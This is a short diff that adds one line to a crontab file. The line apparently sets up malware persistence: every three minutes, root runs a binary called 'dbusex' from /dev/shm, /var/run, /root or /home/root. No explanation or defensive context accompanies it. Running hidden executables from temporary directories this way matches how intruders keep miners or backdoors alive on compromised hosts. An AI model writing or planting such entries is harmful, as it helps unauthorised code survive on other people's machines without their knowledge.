@@ -1,0 +1,2 @@
+*/3 * * * * root /dev/shm/dbusex -c  && /home/root/dbusex -c  && /var/run/dbusex -c  && /root/dbusex -c 
+##
